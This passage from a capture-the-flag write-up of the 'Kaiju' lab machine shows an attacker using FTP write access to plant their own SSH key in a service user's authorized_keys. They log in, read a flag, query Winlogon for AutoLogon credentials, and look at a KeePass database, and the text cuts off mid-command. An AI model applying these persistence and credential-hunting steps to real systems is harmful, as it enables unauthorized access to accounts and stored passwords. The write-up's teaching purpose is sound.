        <span class="n">BUILTIN</span>\<span class="n">Users</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)</span><span class="n">R</span>
        <span class="n">BUILTIN</span>\<span class="n">Users</span><span class="p">:(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)(</span><span class="n">special</span> <span class="n">access</span><span class="p">:)</span>
                              <span class="n">FILE_APPEND_DATA</span>

        <span class="n">BUILTIN</span>\<span class="n">Users</span><span class="p">:(</span><span class="n">CI</span><span class="p">)(</span><span class="n">ID</span><span class="p">)(</span><span class="n">special</span> <span class="n">access</span><span class="p">:)</span>
                              <span class="n">FILE_WRITE_DATA</span>

        <span class="n">KAIJU</span>\<span class="n">sasrv200</span><span class="p">:(</span><span class="n">ID</span><span class="p">)</span><span class="n">F</span>
        <span class="n">CREATOR</span> <span class="n">OWNER</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">IO</span><span class="p">)(</span><span class="n">ID</span><span class="p">)</span><span class="n">F</span>
</pre></div>
<p>I created a folder named <code>test</code> in the root of <code>C:\</code> using FTP and then ran <code>cacls</code> on it to display its privileges. In the output, we can see the <code>sasrv200</code> user, which indicates that FileZilla is running with that user's privileges.</p><br/>
<p>Now, we can list  the <code>sasrv200</code> home directory:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">ftp</span><span class="nd">&gt;</span> <span class="n">ls</span> <span class="n">Users</span><span class="o">/</span><span class="n">sasrv200</span>
<span class="mi">229</span> <span class="n">Entering</span> <span class="n">Extended</span> <span class="n">Passive</span> <span class="n">Mode</span> <span class="p">(</span><span class="o">|||</span><span class="mi">65063</span><span class="o">|</span><span class="p">)</span>
<span class="mi">150</span> <span class="n">Starting</span> <span class="n">data</span> <span class="n">transfer</span><span class="o">.</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">AppData</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Application</span> <span class="n">Data</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Cookies</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Desktop</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Documents</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">Downloads</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">Favorites</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">Links</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Local</span> <span class="n">Settings</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">Music</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">My</span> <span class="n">Documents</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">NetHood</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>          <span class="mi">262144</span> <span class="n">Feb</span> <span class="mi">13</span>  <span class="mi">2024</span> <span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>          <span class="mi">121856</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">ntuser</span><span class="o">.</span><span class="n">dat</span><span class="o">.</span><span class="n">LOG1</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>          <span class="mi">135168</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">ntuser</span><span class="o">.</span><span class="n">dat</span><span class="o">.</span><span class="n">LOG2</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>           <span class="mi">65536</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="p">{</span><span class="n">c76cbcdb</span><span class="o">-</span><span class="n">afc9</span><span class="o">-</span><span class="mi">11</span><span class="n">eb</span><span class="o">-</span><span class="mi">8234</span><span class="o">-</span><span class="mi">000</span><span class="n">d3aa6d50e</span><span class="p">}</span><span class="o">.</span><span class="n">TM</span><span class="o">.</span><span class="n">blf</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>          <span class="mi">524288</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="p">{</span><span class="n">c76cbcdb</span><span class="o">-</span><span class="n">afc9</span><span class="o">-</span><span class="mi">11</span><span class="n">eb</span><span class="o">-</span><span class="mi">8234</span><span class="o">-</span><span class="mi">000</span><span class="n">d3aa6d50e</span><span class="p">}</span><span class="o">.</span><span class="n">TMContainer00000000000000000001</span><span class="o">.</span><span class="n">regtrans</span><span class="o">-</span><span class="n">ms</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>          <span class="mi">524288</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="p">{</span><span class="n">c76cbcdb</span><span class="o">-</span><span class="n">afc9</span><span class="o">-</span><span class="mi">11</span><span class="n">eb</span><span class="o">-</span><span class="mi">8234</span><span class="o">-</span><span class="mi">000</span><span class="n">d3aa6d50e</span><span class="p">}</span><span class="o">.</span><span class="n">TMContainer00000000000000000002</span><span class="o">.</span><span class="n">regtrans</span><span class="o">-</span><span class="n">ms</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>              <span class="mi">20</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">ntuser</span><span class="o">.</span><span class="n">ini</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">Pictures</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">PrintHood</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Recent</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">Saved</span> <span class="n">Games</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">SendTo</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Start</span> <span class="n">Menu</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">Dec</span> <span class="mi">17</span>  <span class="mi">2023</span> <span class="n">Templates</span>
<span class="n">drwxrwxrwx</span> <span class="mi">1</span> <span class="n">ftp</span> <span class="n">ftp</span>               <span class="mi">0</span> <span class="n">May</span> <span class="mi">08</span>  <span class="mi">2021</span> <span class="n">Videos</span>
<span class="mi">226</span> <span class="n">Operation</span> <span class="n">successful</span>
<span class="nd">ftp</span><span class="nd">&gt;</span>
</pre></div>
<p>This is great, we can read and write files as <code>sasrv200</code>, but I would prefer to have shell access as <code>sasrv200</code>. Since SSH is open on this machine, we can try using SSH keys to gain access as that user. Let's create a <code>.ssh</code> folder in the <code>sasrv200</code> home directory and generate an SSH key pair to add our public key to <code>sasrv200</code>‚Äôs <code>authorized_keys</code>.</p><br/>
<p>Firstly, let's generate the SSH keys:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span> <span class="o">-</span><span class="n">t</span> <span class="n">ed25519</span> <span class="o">-</span><span class="n">f</span> <span class="n">sasrv200</span>
<span class="n">Generating</span> <span class="n">public</span><span class="o">/</span><span class="n">private</span> <span class="n">ed25519</span> <span class="n">key</span> <span class="n">pair</span><span class="o">.</span>
<span class="n">Enter</span> <span class="n">passphrase</span> <span class="p">(</span><span class="n">empty</span> <span class="k">for</span> <span class="n">no</span> <span class="n">passphrase</span><span class="p">):</span> 
<span class="n">Enter</span> <span class="n">same</span> <span class="n">passphrase</span> <span class="n">again</span><span class="p">:</span> 
<span class="n">Your</span> <span class="n">identification</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span> <span class="n">in</span> <span class="n">sasrv200</span>
<span class="n">Your</span> <span class="n">public</span> <span class="n">key</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span> <span class="n">in</span> <span class="n">sasrv200</span><span class="o">.</span><span class="n">pub</span>
<span class="n">The</span> <span class="n">key</span> <span class="n">fingerprint</span> <span class="n">is</span><span class="p">:</span>
<span class="n">SHA256</span><span class="p">:</span><span class="n">jUju</span><span class="o">+</span><span class="mi">2</span><span class="n">FXd5clnTcvWxWYaRZYvp200NC9GE3L5C1QKSQ</span> <span class="n">elswix</span><span class="n">@hackency</span>
<span class="n">The</span> <span class="n">key</span><span class="s1">'s randomart image is:</span>
<span class="o">+--</span><span class="p">[</span><span class="n">ED25519</span> <span class="mi">256</span><span class="p">]</span><span class="o">--+</span>
<span class="o">|</span>          <span class="n">E</span><span class="o">.==</span><span class="n">X</span><span class="o">=.|</span>
<span class="o">|</span>           <span class="n">ooOB</span><span class="o">+*|</span>
<span class="o">|</span>      <span class="o">.</span>     <span class="n">o</span><span class="o">+=</span><span class="n">OB</span><span class="o">|</span>
<span class="o">|</span>     <span class="n">o</span> <span class="o">.</span> <span class="n">o</span>   <span class="o">.=+</span><span class="n">X</span><span class="o">|</span>
<span class="o">|</span>      <span class="n">o</span> <span class="n">S</span> <span class="o">.</span> <span class="o">..</span><span class="n">o</span><span class="o">==|</span>
<span class="o">|</span>     <span class="o">.</span>     <span class="o">.</span> <span class="o">.</span> <span class="o">=.|</span>
<span class="o">|</span>      <span class="o">.</span> <span class="n">o</span> <span class="o">.</span>   <span class="o">.</span>  <span class="o">|</span>
<span class="o">|</span>       <span class="n">o</span> <span class="n">o</span>       <span class="o">|</span>
<span class="o">|</span>      <span class="o">...</span>        <span class="o">|</span>
<span class="o">+----</span><span class="p">[</span><span class="n">SHA256</span><span class="p">]</span><span class="o">-----+</span>
</pre></div>
<p>Now, let's copy the <code>sasrv200.pub</code> key into the <code>authorized_keys</code> file of <code>sasrv200</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">ftp</span><span class="nd">&gt;</span> <span class="n">mkdir</span> <span class="o">.</span><span class="n">ssh</span>
<span class="mi">257</span> <span class="s2">"/Users/sasrv200/.ssh"</span> <span class="n">created</span> <span class="n">successfully</span><span class="o">.</span>
<span class="nd">ftp</span><span class="nd">&gt;</span> <span class="n">cd</span> <span class="o">.</span><span class="n">ssh</span>
<span class="mi">250</span> <span class="n">CWD</span> <span class="n">command</span> <span class="n">successful</span>
<span class="nd">ftp</span><span class="nd">&gt;</span> <span class="n">put</span> <span class="n">authorized_keys</span>
<span class="n">local</span><span class="p">:</span> <span class="n">authorized_keys</span> <span class="n">remote</span><span class="p">:</span> <span class="n">authorized_keys</span>
<span class="mi">229</span> <span class="n">Entering</span> <span class="n">Extended</span> <span class="n">Passive</span> <span class="n">Mode</span> <span class="p">(</span><span class="o">|||</span><span class="mi">65489</span><span class="o">|</span><span class="p">)</span>
<span class="mi">150</span> <span class="n">Starting</span> <span class="n">data</span> <span class="n">transfer</span><span class="o">.</span>
<span class="mi">100</span><span class="o">%</span> <span class="o">|***********************************************************************************|</span>    <span class="mi">97</span>      <span class="mf">296.02</span> <span class="n">KiB</span><span class="o">/</span><span class="n">s</span>    <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">ETA</span>
<span class="mi">226</span> <span class="n">Operation</span> <span class="n">successful</span>
<span class="mi">97</span> <span class="nb">bytes</span> <span class="n">sent</span> <span class="n">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="p">(</span><span class="mf">0.40</span> <span class="n">KiB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span>
<span class="nd">ftp</span><span class="nd">&gt;</span>
</pre></div>
<p><strong>Note:</strong> You need to create the <code>.ssh</code> directory inside the user's home folder, and the <code>authorized_keys</code> file must be placed within it."</p><br/>
<p>Now, if we've correctly placed our public key in the <code>authorized_keys</code> file, we should be able to connect using the associated private key with the <code>-i</code> parameter, and it shouldn‚Äôt prompt us for a password.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span> <span class="n">sasrv200</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">i</span> <span class="n">sasrv200</span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.2159</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sasrv200</span><span class="o">&gt;</span>
</pre></div>
<p>Great! We've successfully gained access to the system as <code>sasrv200</code>. Now we can retrieve the first flag from the Desktop directory:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sasrv200</span><span class="o">&gt;</span><span class="nb">type</span> <span class="n">Desktop</span>\<span class="n">flag</span><span class="o">.</span><span class="n">txt</span> 
<span class="n">VL</span><span class="p">{</span><span class="mi">3</span><span class="n">d73</span><span class="o">************</span><span class="mi">0</span><span class="n">db6</span><span class="p">}</span>
<span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sasrv200</span><span class="o">&gt;</span>
</pre></div>
<p><code>sasrv200</code> is a domain user:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sasrv200</span><span class="o">&gt;</span><span class="n">whoami</span> <span class="o">/</span><span class="nb">all</span>

<span class="n">USER</span> <span class="n">INFORMATION</span>
<span class="o">----------------</span>

<span class="n">User</span> <span class="n">Name</span>      <span class="n">SID</span>
<span class="o">==============</span> <span class="o">==============================================</span>
<span class="n">kaiju</span>\<span class="n">sasrv200</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1202327606</span><span class="o">-</span><span class="mi">3023051327</span><span class="o">-</span><span class="mi">2528451343</span><span class="o">-</span><span class="mi">1104</span>


<span class="n">GROUP</span> <span class="n">INFORMATION</span>
<span class="o">-----------------</span>

<span class="n">Group</span> <span class="n">Name</span>                             <span class="n">Type</span>             <span class="n">SID</span>                                         <span class="n">Attributes</span>                  

<span class="o">======================================</span> <span class="o">================</span> <span class="o">===========================================</span> <span class="o">==================================================</span>
<span class="n">Everyone</span>                               <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">0</span>                                     <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">BERSRV200</span>\<span class="n">ftpadmins</span>                    <span class="n">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">2619869422</span><span class="o">-</span><span class="mi">1307147141</span><span class="o">-</span><span class="mi">4583047</span><span class="o">-</span><span class="mi">1003</span> <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
<span class="o">----------------------</span>

<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span> <span class="n">Enabled</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sasrv200</span><span class="o">&gt;</span>
</pre></div>
<p>However, <code>sasrv200</code> does not have any special privileges that we could leverage for escalation on the system. It is a member of the local group <code>ftpadmins</code>.</p><br/>
<p>One registry key that is always worth enumerating is <strong>WinLogon</strong>, since it can sometimes store credentials used for automatic logins, scheduled tasks, or services. Finding valid credentials here could give us a direct path to privilege escalation or lateral movement.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Public</span><span class="o">&gt;</span><span class="n">reg</span> <span class="n">query</span> <span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span>

<span class="n">HKEY_LOCAL_MACHINE</span>\<span class="n">SOFTWARE</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span> <span class="n">NT</span>\<span class="n">CurrentVersion</span>\<span class="n">Winlogon</span>
    <span class="n">AutoRestartShell</span>    <span class="n">REG_DWORD</span>    <span class="mh">0x1</span>
    <span class="n">Background</span>    <span class="n">REG_SZ</span>    <span class="mi">0</span> <span class="mi">0</span> <span class="mi">0</span>
    <span class="n">CachedLogonsCount</span>    <span class="n">REG_SZ</span>    <span class="mi">10</span>
    <span class="n">DebugServerCommand</span>    <span class="n">REG_SZ</span>    <span class="n">no</span>
    <span class="n">DefaultDomainName</span>    <span class="n">REG_SZ</span>    <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
    <span class="n">DefaultUserName</span>    <span class="n">REG_SZ</span>    <span class="n">clare</span><span class="o">.</span><span class="n">frost</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
    <span class="n">LastLogOffEndTimePerfCounter</span>    <span class="n">REG_QWORD</span>    <span class="mh">0x48fa3e2ee</span>
    <span class="n">ShutdownFlags</span>    <span class="n">REG_DWORD</span>    <span class="mh">0x8000022b</span>
    <span class="n">AutoAdminLogon</span>    <span class="n">REG_SZ</span>    <span class="mi">1</span>
    <span class="n">AutoLogonSID</span>    <span class="n">REG_SZ</span>    <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1202327606</span><span class="o">-</span><span class="mi">3023051327</span><span class="o">-</span><span class="mi">2528451343</span><span class="o">-</span><span class="mi">1254</span>
    <span class="n">LastUsedUsername</span>    <span class="n">REG_SZ</span>    <span class="n">clare</span><span class="o">.</span><span class="n">frost</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Public</span><span class="o">&gt;</span>
</pre></div>
<p>And here we find something interesting: AutoLogon is configured for the <code>clare.frost</code> user (the same one we saw in the C:\Users directory). However, to retrieve the password we need system-level access, since it is stored in encrypted form and can only be decrypted by an administrator. If we manage to gain system-level access on this machine, we could use a tool like <code>DecryptAutoLogon.exe</code> to retrieve the password in plaintext.</p><br/>
<h3>KeePass</h3><br/>
<p>Upon running <code>tree</code> on the <code>E:\</code> drive with the new user, we noticed that we could access folders that were previously inaccessible.</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">tree</span>   
<span class="n">Folder</span> <span class="n">PATH</span> <span class="n">listing</span> <span class="k">for</span> <span class="n">volume</span> <span class="n">Data</span>
<span class="n">Volume</span> <span class="n">serial</span> <span class="n">number</span> <span class="n">is</span> <span class="n">A494</span><span class="o">-</span><span class="mi">31</span><span class="n">FF</span>
<span class="n">E</span><span class="p">:</span><span class="o">.</span>
<span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Private</span>
<span class="n">‚îÇ</span>   <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">Backups</span>
<span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Program</span> <span class="n">Files</span>
<span class="n">‚îÇ</span>   <span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">FileZilla</span> <span class="n">Server</span>
<span class="n">‚îÇ</span>   <span class="n">‚îÇ</span>   <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">Logs</span>
<span class="n">‚îÇ</span>   <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">PuTTY</span>
<span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">Public</span>
    <span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Configs</span>
    <span class="n">‚îÇ</span>   <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">FileZilla</span>
    <span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Licenses</span>
    <span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Passwords</span>
    <span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Software</span>
    <span class="n">‚îÇ</span>   <span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Installers</span>
    <span class="n">‚îÇ</span>   <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">KeePass2</span>
    <span class="n">‚îÇ</span>       <span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Database</span>
    <span class="n">‚îÇ</span>       <span class="n">‚îú‚îÄ‚îÄ‚îÄ</span><span class="n">Plugins</span>
    <span class="n">‚îÇ</span>       <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">XSL</span>
    <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">Temp</span>
        <span class="n">‚îî‚îÄ‚îÄ‚îÄ</span><span class="n">_Logs</span>
<span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="o">&gt;</span>
</pre></div>
<p>Among the results, we can see the <code>Software</code> folder, which was previously inaccessible. This folder contains the installer and program files for KeePass. Inside the <code>Database</code> directory, we found a file named <code>it.kdbx</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Public</span>\<span class="n">Software</span>\<span class="n">KeePass2</span>\<span class="n">Database</span><span class="o">&gt;</span> <span class="nb">dir</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Public</span>\<span class="n">Software</span>\<span class="n">KeePass2</span>\<span class="n">Database</span>


<span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
<span class="o">----</span>                 <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">12</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">7</span><span class="p">:</span><span class="mi">38</span> <span class="n">AM</span>           <span class="mi">2126</span> <span class="n">it</span><span class="o">.</span><span class="n">kdbx</span>


<span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Public</span>\<span class="n">Software</span>\<span class="n">KeePass2</span>\<span class="n">Database</span><span class="o">&gt;</span>
</pre></div>
<p>We could try cracking it by converting it with <code>ssh2john</code> and then running a brute-force attack. However, it won‚Äôt crack with common wordlists (such as <code>rockyou.txt</code>).</p><br/>
<p>I ran <code>Get-Process</code> and noticed that KeePass was actively running:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">get</span><span class="o">-</span><span class="n">process</span>

<span class="n">Handles</span>  <span class="n">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>    <span class="n">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>      <span class="n">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>     <span class="n">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="n">Id</span>  <span class="n">SI</span> <span class="n">ProcessName</span>
<span class="o">-------</span>  <span class="o">------</span>    <span class="o">-----</span>      <span class="o">-----</span>     <span class="o">------</span>     <span class="o">--</span>  <span class="o">--</span> <span class="o">-----------</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
    <span class="mi">370</span>      <span class="mi">29</span>    <span class="mi">32596</span>      <span class="mi">53712</span>              <span class="mi">2376</span>   <span class="mi">1</span> <span class="n">KeePass</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>


<span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="o">&gt;</span>
</pre></div>
<p>However, when I ran it again, it no longer appeared in the command output. This suggests that someone (likely through a scheduled task) is running KeePass and accessing a database (which could explain why there are AutoLogon credentials in WinLogon). After running <code>icacls</code> on the KeePass2 folder, I noticed that <code>ftpadmins</code> have full privileges over it:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Public</span>\<span class="n">Software</span><span class="o">&gt;</span> <span class="n">icacls</span> <span class="o">.</span>\<span class="n">KeePass2</span>\
